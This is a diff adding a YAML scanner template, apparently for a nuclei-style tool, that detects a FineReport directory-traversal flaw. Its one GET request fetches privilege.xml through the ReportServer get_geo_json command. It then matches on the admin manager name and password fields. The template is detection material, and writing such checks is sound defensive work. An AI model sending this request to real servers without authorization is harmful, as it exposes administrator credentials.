@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <rootManagerName>
+          - <rootManagerPassword>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml'
+id: finereport-directory-traversal
+info:
+  author: l1nk3r
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Finereport Directory Traversal
+  severity: high
+  tags: finereport,directory-traversal,argus-import
